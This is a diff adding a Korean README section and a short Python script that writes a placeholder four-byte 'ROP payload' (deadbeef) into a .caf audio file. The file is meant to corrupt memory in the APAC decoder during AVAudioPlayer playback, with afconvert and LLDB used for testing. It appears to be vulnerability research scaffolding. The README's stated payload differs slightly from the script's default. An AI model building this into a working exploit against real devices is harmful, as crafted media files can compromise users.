@@ -1,4 +1,93 @@
 
+# 🎯 APAC ROP Payload 자동 삽입 도구
+
+## 📦 파일: `inject_rop_payload.py`
+
+이 도구는 `.caf` 파일(또는 다른 오디오 데이터 파일)의 지정된 위치에 **ROP payload**를 삽입합니다.
+
+---
+
+## ⚙️ 사용법
+
+```bash
+python inject_rop_payload.py input.caf output_patched.caf [offset]
+```
+
+- `input.caf`: 원본 오디오 파일 (예: encodeme로 생성)
+- `output_patched.caf`: 패치된 파일 저장 위치
+- `offset`: 삽입 위치 (기본값 0x100)
+
+---
+
+## 🧨 삽입되는 기본 payload
+
+```hex
+de ad be ef
+```
+
+예: 리틀 엔디안 시스템에서 함수 포인터나 리턴 주소 overwrite를 구성하는 데 사용 가능
+
+---
+
+## 💥 사용 예시
+
+```bash
+python inject_rop_payload.py output.caf rop.caf 0x200
+```
+
+이후 `afconvert`를 사용하여 `.mp4`로 변환하여 AVPlayer 또는 LLDB로 실험 가능:
+
+```bash
+afconvert -o output.mp4 -f mp4f -d apac rop.caf
+```
+
+---
+
+## 🔍 참고
+
+- 삽입 위치는 `frame[]` 버퍼로 접근 가능한 주소 범위 내여야 함
+- AVAudioPlayer가 해당 위치를 디코딩 중 접근하게 되면 **메모리 오염 발생**
+
+
+
+```python
+
+# File: inject_rop_payload.py
+# Description: Patch a .caf (or raw audio) file by injecting a ROP-style payload
+
+import sys
+
+def inject_payload(input_file, output_file, offset=0x100, payload=b'\xff\xff\xff\xff'):
+    with open(input_file, 'rb') as f:
+        data = bytearray(f.read())
+
+    if offset + len(payload) > len(data):
+        print("[-] Payload would exceed file bounds.")
+        return
+
+    print(f"[+] Injecting payload at offset 0x{offset:x}: {payload.hex()}")
+    data[offset:offset+len(payload)] = payload
+
+    with open(output_file, 'wb') as f:
+        f.write(data)
+    print(f"[+] Written to: {output_file}")
+
+if __name__ == '__main__':
+    if len(sys.argv) < 3:
+        print("Usage: python inject_rop_payload.py input.caf output.caf [offset hex]")
+        sys.exit(1)
+
+    infile = sys.argv[1]
+    outfile = sys.argv[2]
+    offset = int(sys.argv[3], 16) if len(sys.argv) > 3 else 0x100
+
+    # Simulate 4-byte ROP overwrite
+    rop = b'\xde\xad\xbe\xef'
+    inject_payload(infile, outfile, offset, rop)
+
+
+```
+
 # LLDB APAC OOB 자동 분석 스크립트 사용법
 
 ---
